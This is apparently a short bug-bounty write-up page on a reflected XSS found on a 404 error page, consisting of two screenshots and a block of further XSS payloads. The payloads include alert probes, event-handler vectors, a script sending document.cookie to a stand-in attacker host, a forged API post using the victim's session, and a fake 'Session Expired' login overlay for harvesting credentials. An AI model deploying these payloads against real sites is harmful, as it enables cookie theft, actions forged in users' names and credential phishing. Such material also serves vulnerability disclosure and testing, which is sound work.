---
description: VDP - EASY
---

# Reflected XSS on 404 Error Page - 02

<figure><img src="../../.gitbook/assets/image (1528).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1527).png" alt=""><figcaption></figcaption></figure>

***

### Others XSS

````html

<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image with error handler -->
<img src=x onerror="alert('XSS')">

<!-- SVG with onload -->
<svg onload="alert('XSS')">

<!-- Cookie theft attempt (httpOnly cookies won't be exposed) -->
<script>fetch('http://attacker.example.com/?c='+document.cookie)</script>

<!-- Session hijacking via API (cookies are sent automatically) -->
<script>
fetch('/api/posts', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({title: 'Hacked', body: 'This post was created via Reflected XSS'}),
  credentials: 'include'
});
</script>

<!-- Phishing overlay -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;display:flex;align-items:center;justify-content:center">
  <div style="background:#16181c;padding:32px;border-radius:16px;text-align:center">
    <h2 style="color:#e7e9ea">Session Expired</h2>
    <p style="color:#71767b">Please log in again</p>
    <input placeholder="Username" style="margin:8px;padding:12px;background:transparent;border:1px solid #2f3336;color:#e7e9ea;border-radius:4px">
    <input type="password" placeholder="Password" style="margin:8px;padding:12px;background:transparent;border:1px solid #2f3336;color:#e7e9ea;border-radius:4px">
    <button style="margin:8px;padding:12px 24px;background:#1d9bf0;color:white;border:none;border-radius:9999px;font-weight:bold;cursor:pointer">Sign in</button>
  </div>
</div>
```
````
